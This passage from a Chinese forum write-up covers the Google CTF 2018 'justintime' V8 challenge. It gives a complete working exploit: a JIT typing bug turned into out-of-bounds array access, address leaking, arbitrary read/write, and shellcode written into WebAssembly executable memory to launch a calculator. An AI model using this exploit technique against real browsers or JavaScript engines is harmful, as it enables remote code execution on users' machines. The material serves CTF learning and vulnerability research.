`f2i(oob_arr[addr_idx])` `-` ``` 1n``; ```<br><br>    ``` /``/ ``` `add offset` `29` `*` `8` `=` `E8`<br><br>    `let jump_table_ptr` `=` `wasm_instance_addr` `+` ``` 0xE8n``; ```<br><br>    ``` /``/ ``` `read the number at jump_table_ptr`<br><br>    ``` /``/ ``` `which` `is` `jump table start address`<br><br>    `oob_arr[bp_idx]` `=` `i2f(jump_table_ptr);`  ``` /``/ ``` `change backing pointer`<br><br>    `let view` `=` `new BigUint64Array(buf_arr);`  ``` /``/ ``` `read backing store` `in` `uint64` `format`<br><br>    `let jump_table_addr` `=` ``` view[``0``]; ```<br><br>    `console.log(tohex(jump_table_addr));`<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`|

输出结果：

|   |   |
|---|---|
|1<br><br>2<br><br>3|``` test@test``-``vm:~``/``ctf2018$ node ``` ``` -``-``allow``-``natives``-``syntax try2.js ``` <br><br>`00003e9245ae8000`<br><br>``` 4.243991582e``-``314 ```|

输出结果正常！

## [](https://bbs.kanxue.com/thread-270653.htm)4.7 写入shellcode，触发！

接下来这事儿就很简单了，我们已经知道怎么获取对象地址，怎么读写任意地址，也知道要写入的位置，只要把所有东西凑到一起就可以了。

这次给出完整的代码：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34<br><br>35<br><br>36<br><br>37<br><br>38<br><br>39<br><br>40<br><br>41<br><br>42<br><br>43<br><br>44<br><br>45<br><br>46<br><br>47<br><br>48<br><br>49<br><br>50<br><br>51<br><br>52<br><br>53<br><br>54<br><br>55<br><br>56<br><br>57<br><br>58<br><br>59<br><br>60<br><br>61<br><br>62<br><br>63<br><br>64<br><br>65<br><br>66<br><br>67<br><br>68<br><br>69<br><br>70<br><br>71<br><br>72<br><br>73<br><br>74|``` let shellcode``=``[``0x90909090``,``0x90909090``,``0x782fb848``,``0x636c6163``,``0x48500000``,``0x73752fb8``,``0x69622f72``,``0x8948506e``,``0xc03148e7``,``0x89485750``,``0xd23148e6``,``0x3ac0c748``,``0x50000030``,``0x4944b848``,``0x414c5053``,``0x48503d59``,``0x3148e289``,``0x485250c0``,``0xc748e289``,``0x00003bc0``,``0x050f00``]; ```<br><br>`let ab` `=` ``` new ArrayBuffer(``8``); ```<br><br>`let fv` `=` `new Float64Array(ab);`<br><br>`let dv` `=` `new BigUint64Array(ab);`<br><br>`function f2i(f) {`<br><br>  ``` fv[``0``] ``` `=` `f;`<br><br>  `return` ``` dv[``0``]; ```<br><br>`}`<br><br>`function i2f(i) {`<br><br>  ``` dv[``0``] ``` `=` `BigInt(i);`<br><br>  `return` ``` fv[``0``]; ```<br><br>`}`<br><br>`let AB_LENGTH` `=` ``` 0x100``; ```<br><br>`let AB_LENGTH_64` `=` ``` 0x0000010000000000``; ``` <br><br>`let OOB_LENGTH_64` `=` ``` 0x0000006400000000``; ```<br><br>`let MARKER1` `=` ``` 0x11``; ```<br><br>`let MARKER1_64` `=` ``` 0x0000001100000000``; ```<br><br>`function pwn(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``]; ```<br><br>  `oob_arr` `=` ``` [``2.2``, ``` ``` 2.2``]; ```<br><br>  `obj_arr` `=` `[MARKER1, Math];`<br><br>  `buf_arr` `=` `new ArrayBuffer(AB_LENGTH);`<br><br>  ``` /``/ ``` `overwrite the length of oob_arr`<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```<br><br>  `y` `=` `y` `*` ``` 2``; ```<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `bug_arr[y]` `=` `i2f(OOB_LENGTH_64);`<br><br>  `if` `(x) {`<br><br>    `let addr_idx` `=` `oob_arr.indexOf(i2f(MARKER1_64))` `+` ``` 1``; ```<br><br>    `let bp_idx` `=` `oob_arr.indexOf(i2f(AB_LENGTH_64))` `+` ``` 1``; ```<br><br>    `var wasm_code` `=` ``` new Uint8Array([``0``,``97``,``115``,``109``,``1``,``0``,``0``,``0``,``1``,``133``,``128``,``128``,``128``,``0``,``1``,``96``,``0``,``1``,``127``,``3``,``130``,``128``,``128``,``128``,``0``,``1``,``0``,``4``,``132``,``128``,``128``,``128``,``0``,``1``,``112``,``0``,``0``,``5``,``131``,``128``,``128``,``128``,``0``,``1``,``0``,``1``,``6``,``129``,``128``,``128``,``128``,``0``,``0``,``7``,``145``,``128``,``128``,``128``,``0``,``2``,``6``,``109``,``101``,``109``,``111``,``114``,``121``,``2``,``0``,``4``,``109``,``97``,``105``,``110``,``0``,``0``,``10``,``138``,``128``,``128``,``128``,``0``,``1``,``132``,``128``,``128``,``128``,``0``,``0``,``65``,``42``,``11``]); ```<br><br>    `var wasm_mod` `=` `new WebAssembly.Module(wasm_code);`<br><br>    `var wasm_instance` `=` `new WebAssembly.Instance(wasm_mod);`<br><br>    `var f` `=` `wasm_instance.exports.main;`<br><br>    ``` /``/ ``` `get address of wasm_instance`<br><br>    ``` obj_arr[``1``] ``` `=` `wasm_instance;`<br><br>    `let wasm_instance_addr` `=` `f2i(oob_arr[addr_idx])` `-` ``` 1n``; ```<br><br>    ``` /``/ ``` `add offset` `29` `*` `8` `=` `E8`<br><br>    `let jump_table_ptr` `=` `wasm_instance_addr` `+` ``` 0xE8n``; ```<br><br>    ``` /``/ ``` `read the number at jump_table_ptr`<br><br>    ``` /``/ ``` `which` `is` `jump table start address`<br><br>    `oob_arr[bp_idx]` `=` `i2f(jump_table_ptr);`  ``` /``/ ``` `change backing pointer`<br><br>    `let view` `=` `new BigUint64Array(buf_arr);`  ``` /``/ ``` `read backing store` `in` `uint64` `format`<br><br>    `let jump_table_addr` `=` ``` view[``0``]; ```<br><br>    ``` /``/ ``` `write` `in` `shellcode at jump table`<br><br>    `oob_arr[bp_idx]` `=` `i2f(jump_table_addr);`  ``` /``/ ``` `change backing pointer`<br><br>    `view` `=` `new Uint32Array(buf_arr);`   ``` /``/ ``` `write backing store` `in` `uint32` `format`<br><br>    `for` `(let i` `=` ``` 0``; i < shellcode.length; ``` ``` +``+``i) { ```<br><br>      `view[i]` `=` `shellcode[i];`<br><br>    `}`<br><br>    `f();`   ``` /``/ ``` `调用函数，执行shellcode`<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`<br><br>`for` `(var i` `=` ``` 0``; i < ``` ``` 0x10``; ``` ``` +``+``i) { ```<br><br>  `pwn(false);`<br><br>`}`<br><br>``` %``OptimizeFunctionOnNextCall(pwn); ```<br><br>`console.log(pwn(true));`|

成功弹出计算器：

![图片描述](https://bbs.kanxue.com/upload/attach/202112/600394_7A6GMCMZZ8ZMK5Z.png)

## [](https://bbs.kanxue.com/thread-270653.htm)4.8 关于fakeobj和addrof

[saelo的文章](http://www.phrack.org/papers/attacking_javascript_engines.html)详细地介绍了如何对OOB类型的漏洞进行利用，提到了通过fakeobj和addrof原语实现任意地址读写（addrof原语接收一个对象参数并返回其地址，fakeobj原语接收一个地址参数并返回一个位于该地址的假的对象），从而写入shellcode并执行。由于这篇文章针对的是Webkit的引擎JavaScriptCore，我对此并不十分了解，因此没有仔细看这篇文章，也就没放在参考资料中。

参考资料10中对于该利用方法在v8上的应用给出了很好的示例介绍，这篇资料中专门定义了addrof和fakeobj函数，然后通过这两个函数又定义了任意读和任意写函数，个人觉得是这种漏洞利用方法的模板化范例了。

不过由于此次分析的漏洞特性，不需要也不方便单独定义出fakeobj和addrof函数式。一方面这次的漏洞需要很精细地挑选数值，实现一次OOB，虽然OOB的长度可变，但每组确定的数值导致的OOB长度是固定的，这种情况下单独定义函数写出来的代码会很乱；另一方面，由于这次漏洞可以覆盖`bug_arr`数组后可变长的一段内存，我们可以直接利用这一点覆盖后方数组的长度属性，从而获得一种更灵活的OOB访问方式，最终也实现了类似addrof和fakeobj的功能，从而实现了任意地址读写。

具体来说，代码中的addrof部分很明显，就是下面这段代码：

|   |   |
|---|---|
|1<br><br>2<br><br>3|``` /``/ ``` `get address of wasm_instance`<br><br>``` obj_arr[``1``] ``` `=` `wasm_instance;`<br><br>`let wasm_instance_addr` `=` `f2i(oob_arr[addr_idx])` `-` ``` 1n``; ```|

将想要获得地址的对象放在oob_arr后方的一个固定位置，然后通过越界读就可以获得其地址了。

fakeobj的功能不太明显，它并不是一段代码，而是buf_arr本身，可以说buf_arr就是一个fake object。因为每次我们想在某个地址上读写数据的时候，就用这个地址替换buf_arr的backing pointer，这样就算是得到了一个“假的”对象了，然后再通过typed array objects对目标地址进行读写：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5|``` /``/ ``` `read the number at jump_table_ptr`<br><br>``` /``/ ``` `which` `is` `jump table start address`<br><br>`oob_arr[bp_idx]` `=` `i2f(jump_table_ptr);`  ``` /``/ ``` `change backing pointer`<br><br>`let view` `=` `new BigUint64Array(buf_arr);`  ``` /``/ ``` `read backing store` `in` `uint64` `format`<br><br>`let jump_table_addr` `=` ``` view[``0``]; ```|

# [](https://bbs.kanxue.com/thread-270653.htm)5. 总结

这次的漏洞分析花费了我近一个月的时间，一开始想要分析的并不是这个CTF题目，而是一个V8的CVE漏洞，结果发现自己什么都不懂，然后就从参考资料一路点击，最终定位到了这道题目。

除了基础资料之外，看的第一篇针对性文章是参考资料2，然后就陷入了fakeobj的怪圈（那时候我还不知道这是什么东西），最终通过参考资料10的解释才逐渐理出头绪，虽然方法相同，但是你会发现我的代码和参考资料2还是有很大差别的。我之所以添加了最后的4.8小节，一个很重要的原因就是要把一开始我的疑惑给理清楚。

在阅读这些参考资料的过程中，我发现[saelo的文章](http://www.phrack.org/papers/attacking_javascript_engines.html)真的是一座里程碑，所有OOB的漏洞最后都提到了这篇文章，因此一定要把它加到我的待阅清单里。

最后十分感谢参考资料中的所有文章作者。

如果内容有错误，欢迎指正 (_^_^\_)

# [](https://bbs.kanxue.com/thread-270653.htm)6. 参考资料

1. [Github项目](https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time)（题目信息及资料下载）
1. [Introduction to TurboFan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)（关键文章！！！）
1. [Double-precision floating-point format](https://en.wikipedia.org/wiki/Double-precision_floating-point_format)（基础知识）
1. [Google CTF justintime exploit](https://eternalsakura13.com/2018/11/19/justintime/)（参考，没有仔细看）
1. [V8 Objects and Their Structures](https://pwnbykenny.com/2020/07/05/v8-objects-and-their-structures/)（基础知识）
1. [An Introduction to Speculative Optimization in V8](https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8)（只看了前半部分，v8基础）
1. [Chrome V8文档](https://v8.dev/blog)（一些不了解的琐碎的知识点是在这里学习的）
1. [Exploiting the Math.expm1 typing bug in V8](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8)（关键文章！！！）
1. [ArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer)（关于ArrayBuffer的介绍）
1. [Exploiting v8: \*CTF 2019 oob-v8](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)（关键文章！！！个人觉得对于addrof和fakeobj介绍的很好）

[\[培训\]《安卓高级研修班(网课)》月薪三万计划，掌握调试、分析还原ollvm、vmp的方法，定制art虚拟机自动化脱壳的方法](https://www.kanxue.com/book-section_list-84.htm)

最后于  2021-12-7 10:23 被LarryS编辑 ，原因： 修改标题

[#浏览器相关](https://bbs.kanxue.com/forum-171-1-184.htm)

收藏 ・8

送赞 ・6

支持

分享

赞赏记录

参与人

雪币

留言

时间

伟叔叔

为你点赞~

2023-3-18 04:58

一笑人间万事

为你点赞~

2022-7-27 00:57

心游尘世外

为你点赞~

2022-7-26 22:44

飘零丶

为你点赞~

2022-7-17 02:29

wmsuper

为你点赞~

2021-12-24 14:17

shengpu

为你点赞~

2021-12-9 15:11

|**最新回复** (3)|   |
|---|---|
|[![](https://passport.kanxue.com/upload/avatar/758/577758.png?1)](https://bbs.kanxue.com/user-home-577758.htm)|[ricroon](https://bbs.kanxue.com/user-home-577758.htm) <br><br> <br><br> [2 楼](https://bbs.kanxue.com/thread-270653-1.htm#1705957)<br><br>写的很详细，消化还需要时间，感谢楼主<br><br>2021-12-7 14:21<br><br> <br><br> 引用  举报<br><br> <br><br> 0|
|[![](https://passport.kanxue.com/upload/avatar/752/752.png?1)](https://bbs.kanxue.com/user-home-752.htm)|[海风月影](https://bbs.kanxue.com/user-home-752.htm)   [22](https://bbs.kanxue.com/user-752-1-1.htm)<br><br> <br><br> [3 楼](https://bbs.kanxue.com/thread-270653-1.htm#1706023)<br><br>牛逼，学习了<br><br>2021-12-8 11:12<br><br> <br><br> 引用  举报<br><br> <br><br> 0|
|[![](https://bbs.kanxue.com/view/img/avatar.png)](https://bbs.kanxue.com/user-home-14494.htm)|[ssarg](https://bbs.kanxue.com/user-home-14494.htm) <br><br> <br><br> [4 楼](https://bbs.kanxue.com/thread-270653-1.htm#1706165)<br><br>楼主能否测下目前最新版v8和chakracore谁快？![](https://bbs.kanxue.com/view/img/face/67.gif)<br><br>2021-12-9 14:49<br><br> <br><br> 引用  举报<br><br> <br><br> 0|
|[![](https://passport.kanxue.com/upload/avatar/307/938307.png?1712462640)](https://bbs.kanxue.com/user-938307.htm)|pandarice<br><br>温馨提示：点击 **引用** 按钮再回帖，可回复并 **短消息** 提示对方<br><br>回帖 表情 [雪币赚取及消费](https://bbs.pediy.com/thread-247709.htm)<br><br> 高级回复|

返回

[![](https://passport.kanxue.com/upload/avatar/394/600394.png?1630573206)](https://bbs.kanxue.com/user-home-600394.htm)

[LarryS](https://bbs.kanxue.com/user-home-600394.htm)

[13](https://bbs.kanxue.com/user-600394-1-1.htm)

[](https://bbs.kanxue.com/thread-260144.htm)![](https://bbs.kanxue.com/view/img/stars04.gif)

![](https://passport.kanxue.com/pc/view/img/moon.gif)![](https://passport.kanxue.com/pc/view/img/moon.gif)![](https://passport.kanxue.com/pc/view/img/star.gif)![](https://passport.kanxue.com/pc/view/img/star.gif)![](https://passport.kanxue.com/pc/view/img/star.gif)

[28](https://bbs.kanxue.com/homepage-600394.htm)

发帖

[58](https://bbs.kanxue.com/homepage-post-600394.htm)

回帖

[660](https://bbs.kanxue.com/thread-260144.htm)

RANK

关注

[私信](https://www.kanxue.com/pm-send.htm?name=LarryS)

1. [0. 前言](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_0)
1. [1. 环境搭建](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_1)
1. [2. 问题代码分析](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_2)
1. [3. 漏洞分析](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_3)
   1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_0)
   1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_1)
   1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_2)
   1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_3)
1. [4. 利用OOB W/R的方法](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_4)
   1. [4.1 前置知识](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_4)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_0)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_1)
   1. [4.2 利用方法分析](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_5)
   1. [4.3 更简单的OOB方式](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_6)
      1. [4.3.1 调试方法](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_2)
      1. [4.3.2 实验代码](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_3)
      1. [4.3.3 调试分析](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_4)
      1. [4.3.4 覆写长度属性](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_5)
   1. [4.4 获取对象地址的能力](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_7)
   1. [4.5 任意地址读写的能力](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_8)
   1. [4.6 利用WebAssembly获取可执行内存地址](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_9)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_6)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_7)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_8)
      1. [](https://bbs.kanxue.com/thread-270653.htm#msg_header_h3_9)
   1. [4.7 写入shellcode，触发！](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_10)
   1. [4.8 关于fakeobj和addrof](https://bbs.kanxue.com/thread-270653.htm#msg_header_h2_11)
1. [5. 总结](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_5)
1. [6. 参考资料](https://bbs.kanxue.com/thread-270653.htm#msg_header_h1_6)

他的文章

- [HEVD Windows 内核漏洞利用学习代码分享](https://bbs.kanxue.com/thread-275101.htm)  10642
- [\[原创\]如何阅读只包含特殊符号的powershell脚本](https://bbs.kanxue.com/thread-271570.htm)  20786
- [\[原创\]Golang版本简易fuzzer及debugger实践](https://bbs.kanxue.com/thread-271156.htm)  22998
- [\[原创\]Chrom V8分析入门——Google CTF2018 justintime分析](https://bbs.kanxue.com/thread-270653.htm) 26869
- [\[原创\]详细分析CVE-2021-40444远程命令执行漏洞](https://bbs.kanxue.com/thread-270000.htm)  23542

![](https://www.kanxue.com/upload/attach/mediapic/_202407261723_F2TH9YM6E8YEUXE.jpg)

[关于我们](https://zhuanlan.kanxue.com/article-56.htm)

[联系我们](https://www.kanxue.com/user-online_sendmsg.htm)

[企业服务](https://qifu.kanxue.com/)

![](https://bbs.kanxue.com/view/img/gongzhonghao.png)

看雪公众号

专注于PC、移动、智能设备安全研究及逆向工程的开发者社区

[![](https://www.kanxue.com/upload/attach/_202402261148_83HQJQM8T2UNKHC.png)](https://bbs.kanxue.com/thread-280627.htm)

[![](https://www.kanxue.com/upload/attach/_202211071314_TJXM7FJJ2AJJ4H6.jpg)](https://www.kanxue.com/book-leaflet-83.htm)

©2000-2024 看雪 | Based on [Xiuno BBS](http://bbs.xiuno.com/)\
域名：[加速乐](https://www.yunaq.com/) | SSL证书：[亚洲诚信](https://www.trustasia.com/trustasia) | [安全网易易盾](http://dun.163.com/?from=kanxue_DDoS_2018&hmsr=kanxue%C2%A0)

[看雪SRC](https://ce.kanxue.com/project-test_read-538.htm) | [看雪APP](https://bbs.kanxue.com/thread-260116.htm) | 公众号：ikanxue | [关于我们](https://zhuanlan.kanxue.com/article-56.htm) | [联系我们](https://www.kanxue.com/user-online_sendmsg.htm) | [企业服务](https://zhuanlan.kanxue.com/article-1.htm)\
Processed: **0.032**s, SQL: **40** / [沪ICP备2022023406号](http://beian.miit.gov.cn/) / [沪公网安备 31011502006611号](http://www.beian.gov.cn/portal/registerSystemInfo?domainname=%27pediy.com%27&recordcode=31011502006611)

切换\
主题

返回\
顶部

//
